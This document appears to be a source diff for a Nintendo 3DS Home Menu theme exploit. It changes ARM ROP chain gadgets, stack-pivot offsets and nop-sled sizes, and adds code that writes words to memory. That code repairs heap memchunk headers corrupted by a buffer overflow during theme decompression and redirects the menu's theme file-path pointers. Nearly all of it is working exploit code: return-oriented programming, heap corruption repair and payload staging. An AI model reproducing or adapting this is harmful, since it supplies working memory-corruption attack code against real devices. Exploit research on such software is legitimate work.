@@ -15,7 +15,7 @@ L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from o
 
 //The addresses for the ROP-chain is from an include, see the Makefile gcc line with -include / README.
 
-#define TARGETOVERWRITE_STACKADR TARGETOVERWRITE_MEMCHUNKADR+12
+#define TARGETOVERWRITE_STACKADR TARGETOVERWRITE_MEMCHUNKADR+12-0x14
 
 #define ROP_BXR1 POP_R4LR_BXR1+4
 #define ROP_BXLR ROP_LDR_R0FROMR0+4 //"bx lr"
@@ -32,7 +32,7 @@ L_1e95e0: objectptr = *(inr0+0x28); if(objectptr)<calls vtable funcptr +8 from o
 	#if NEW3DS==0
 		#define CODEBINPAYLOAD_SIZE 0x4000
 	#else
-		#if (REGIONVAL==0 && MENUVERSION<19476) || (REGIONVAL!=0 && MENUVERSION<16404)//Check for system-version <v9.6.
+		#if (((REGIONVAL==0 && MENUVERSION<19476) || (REGIONVAL!=0 && MENUVERSION<16404)) && REGIONVAL!=4)//Check for system-version <v9.6.
 			#define CODEBINPAYLOAD_SIZE 0x4000
 		#else
 			#define CODEBINPAYLOAD_SIZE 0x6000
@@ -151,13 +151,13 @@ ROP_SETLR ROP_POPPC
 .word POP_R1PC
 .word (ORIGINALOBJPTR_BASELOADADR+8) @ r1
 
-.word ROP_LDRR1R1_STRR1R0 @ Restore the saved r4 value overwritten by memchunkhax with the original value.
+.word ROP_LDRR1R1_STRR1R0 @ Write the original value for r4, to the location used for loading r4 from on stack @ RET2MENU.
 .endm
 
 .macro RET2MENUCODE
 PREPARE_RET2MENUCODE
 
-ROPMACRO_STACKPIVOT TARGETOVERWRITE_STACKADR, POP_R4R5R6PC @ Begin the stack-pivot ROP to restart execution from the previously corrupted stackframe.
+ROPMACRO_STACKPIVOT TARGETOVERWRITE_STACKADR, POP_R4FPPC @ Begin the stack-pivot ROP to restart execution from the previously corrupted stackframe.
 .endm
 
 .macro COND_THROWFATALERR
@@ -214,6 +214,18 @@ ROPMACRO_STACKPIVOT TARGETOVERWRITE_STACKADR, POP_R4R5R6PC @ Begin the stack-piv
 .if \stackaddr_cmpmatch
 ROPMACRO_STACKPIVOT \stackaddr_cmpmatch, ROP_POPPC
 .endif
+.endm
+
+.macro ROPMACRO_WRITEWORD addr, value
+ROP_SETLR ROP_POPPC
+
+.word POP_R0PC
+.word \addr @ r0
+
+.word POP_R1PC
+.word \value @ r1
+
+.word ROP_STR_R1TOR0
 .endm
 
 _start:
@@ -325,6 +337,51 @@ sdcfg_pad:
 .space 0x10
 #endif
 
+#ifdef LOADOTHER_THEMEDATA
+filepath_theme_stringblkstart:
+@ Originally these strings used the "sd:/" archive opened by the below ROP, but that's rather pointless since the BGM gets read from the normal extdata path anyway.
+
+#ifdef FILEPATHPTR_THEME_SHUFFLE_BODYRD
+filepath_theme_shuffle_bodyrd:
+.string16 "theme:/yodyCache_rd.bin"
+.align 2
+#endif
+
+#ifdef FILEPATHPTR_THEME_REGULAR_THEMEMANAGE
+filepath_theme_regular_thememanage:
+.string16 "theme:/yhemeManage.bin"
+.align 2
+#endif
+
+#ifdef FILEPATHPTR_THEME_REGULAR_BODYCACHE
+filepath_theme_regular_bodycache:
+.string16 "theme:/yodyCache.bin"
+.align 2
+#endif
+
+/*filepath_theme_regular_bgmcache:
+.string16 "sd:/BgmCache.bin"
+.align 2*/
+
+#ifdef FILEPATHPTR_THEME_SHUFFLE_THEMEMANAGE
+filepath_theme_shuffle_thememanage:
+.string16 "theme:/yhemeManage_%02d.bin"
+.align 2
+#endif
+
+#ifdef FILEPATHPTR_THEME_SHUFFLE_BODYCACHE
+filepath_theme_shuffle_bodycache:
+.string16 "theme:/yodyCache_%02d.bin"
+.align 2
+#endif
+
+/*filepath_theme_shuffle_bgmcache:
+.string16 "sd:/BgmCache_%02d.bin"
+.align 2*/
+
+filepath_theme_stringblkend:
+#endif
+
 tmp_scratchdata:
 .space 0x400
 
@@ -343,7 +400,7 @@ ROP_SETLR ROP_POPPC
 .word (HEAPBUF + (rop_ret2menu_stack_lrval - _start)) @ r0
 
 .word POP_R1PC
-.word TARGETOVERWRITE_STACKADR+0xc @ r1
+.word TARGETOVERWRITE_STACKADR+0x20 @ r1
 
 .word ROP_LDRR1R1_STRR1R0 @ Copy the saved LR value on the stack which gets used during RET2MENU, to rop_ret2menu_stack_lrval.
 
@@ -352,10 +409,23 @@ rop_ret2menu_stack_lrval:
 .word 0
 
 .word POP_R1PC
+#ifndef LOADOTHER_THEMEDATA
+
 #if (REGIONVAL==0 && MENUVERSION>15360) || (REGIONVAL!=0 && REGIONVAL!=4 && MENUVERSION>12288) || (REGIONVAL==4)//Check for system-version >v9.2.
 .word 0xfffffff4
 #else
 .word 0xfffffff8
+#endif
+
+#else
+
+@ In addition to what was described above, rerun the theme-loading code during RET2MENU with this.
+#if (REGIONVAL==0 && MENUVERSION>15360) || (REGIONVAL!=0 && REGIONVAL!=4 && MENUVERSION>12288) || (REGIONVAL==4)//Check for system-version >v9.2.
+.word 0xfffffeac
+#else
+.word 0xffffffd4
+#endif
+
 #endif
 
 .word ROP_ADDR0_TO_R1 @ r0 = rop_ret2menu_stack_lrval + <above r1 value>
@@ -366,13 +436,60 @@ rop_ret2menu_stack_lrval:
 .word ROP_STR_R0TOR1 @ Write the above r0 value to rop_ret2menu_stack_newlrval.
 
 .word POP_R0PC
-.word TARGETOVERWRITE_STACKADR+0xc @ r0
+.word TARGETOVERWRITE_STACKADR+0x20 @ r0
 
 .word POP_R1PC
 rop_ret2menu_stack_newlrval:
 .word 0 @ r1
 
 .word ROP_STR_R1TOR0 @ Write the new LR value to the stack.
+
+@ Restore the heap freemem memchunk header following the buffer on the heap, to what it was prior to being overwritten @ theme decompression.
+ROPMACRO_WRITEWORD (HEAPBUF+0x2a0000 + 0x8), 0x0
+ROPMACRO_WRITEWORD (HEAPBUF+0x2a0000 + 0xc), 0x0
+
+@ Write the below value to a heapctx state ptr, which would've been the addr value located there if the memchunk wasn't overwritten, after the memfree was done.
+ROPMACRO_WRITEWORD (HEAPBUF-0x80+0x40002c + 0x3c + 0x4), (HEAPBUF-0x58)
+
+@ Write the below value to a freemem memchunk header ptr, which would've been the addr value located there if the memchunk wasn't overwritten(the one targeted in the buf overflow), after the memfree  was done.
+#if (((REGIONVAL==0 && MENUVERSION<19476) || (REGIONVAL!=0 && MENUVERSION<16404)) && REGIONVAL!=4)//Check for system-version <v9.6.
+ROPMACRO_WRITEWORD (HEAPBUF-0x80 + (0x10+0xc)), 0x0
+#else
+ROPMACRO_WRITEWORD (HEAPBUF-0x80 + (0x28+0xc)), 0x0
+#endif
+
+#ifdef LOADOTHER_THEMEDATA
+@ Write value 0x0 to the value which will get popped into r6 @ RET2MENU ROP.
+ROPMACRO_WRITEWORD TARGETOVERWRITE_STACKADR+0x8, 0x0
+
+@ Copy the theme filepath strings to 0x0fff0000.
+CALLFUNC_NOSP MEMCPY, 0x0fff0000, (HEAPBUF + ((filepath_theme_stringblkstart) - _start)), (filepath_theme_stringblkend - filepath_theme_stringblkstart), 0
+
+@ Overwrite the string ptrs in Home Menu .data which are used for the theme extdata filepaths. Don't touch the BGM paths, since those don't get used for reading during theme-load anyway.
+#ifdef FILEPATHPTR_THEME_SHUFFLE_BODYRD
+ROPMACRO_WRITEWORD FILEPATHPTR_THEME_SHUFFLE_BODYRD, (0x0fff0000 + (filepath_theme_shuffle_bodyrd - filepath_theme_stringblkstart))
+#endif
+
+#ifdef FILEPATHPTR_THEME_REGULAR_THEMEMANAGE
+ROPMACRO_WRITEWORD FILEPATHPTR_THEME_REGULAR_THEMEMANAGE, (0x0fff0000 + (filepath_theme_regular_thememanage - filepath_theme_stringblkstart))
+#endif
+
+#ifdef FILEPATHPTR_THEME_REGULAR_BODYCACHE
+ROPMACRO_WRITEWORD FILEPATHPTR_THEME_REGULAR_BODYCACHE, (0x0fff0000 + (filepath_theme_regular_bodycache - filepath_theme_stringblkstart))
+#endif
+
+//ROPMACRO_WRITEWORD (0x32e604+0x10), (0x0fff0000 + (filepath_theme_regular_bgmcache - filepath_theme_stringblkstart))
+
+#ifdef FILEPATHPTR_THEME_SHUFFLE_THEMEMANAGE
+ROPMACRO_WRITEWORD FILEPATHPTR_THEME_SHUFFLE_THEMEMANAGE, (0x0fff0000 + (filepath_theme_shuffle_thememanage - filepath_theme_stringblkstart))
+#endif
+
+#ifdef FILEPATHPTR_THEME_SHUFFLE_BODYCACHE
+ROPMACRO_WRITEWORD FILEPATHPTR_THEME_SHUFFLE_BODYCACHE, (0x0fff0000 + (filepath_theme_shuffle_bodycache - filepath_theme_stringblkstart))
+#endif
+
+//ROPMACRO_WRITEWORD (0x32e604+0x1c), (0x0fff0000 + (filepath_theme_shuffle_bgmcache - filepath_theme_stringblkstart))
+#endif
 
 #ifdef LOADSDCFG_PADCHECK
 @ Load the cfg file. Errors are ignored with file-reading.
@@ -487,7 +604,7 @@ padcheck_sp_value:
 
 .word POP_R1PC
 padcheck_pc_value:
-.word POP_R4R5R6PC @ r1
+.word POP_R4FPPC @ r1
 
 .word ROP_STR_R1TOR0 @ Write to the word which will be popped into pc.
 
@@ -511,7 +628,7 @@ padcheck_pc_value:
 .word HEAPBUF + (stackpivot_pcloadword - _start) @ r0
 
 .word POP_R1PC
-.word POP_R4R5R6PC @ r1
+.word POP_R4FPPC @ r1
 
 .word ROP_STR_R1TOR0 @ Write to the word which will be popped into pc.
 
@@ -803,7 +920,7 @@ codedatastart:
 #if NEW3DS==0
 .space 0x200 @ nop-sled
 #else
-#if (REGIONVAL==0 && MENUVERSION<19476) || (REGIONVAL!=0 && MENUVERSION<16404)
+#if (((REGIONVAL==0 && MENUVERSION<19476) || (REGIONVAL!=0 && MENUVERSION<16404)) && REGIONVAL!=4)
 .space 0x1000
 #else
 .space 0x3000 @ Size >=0x2000 is needed for SKATER >=v9.6(0x3000 for SKATER system-version v9.9), but doesn't work with the initial version of SKATER for whatever reason.
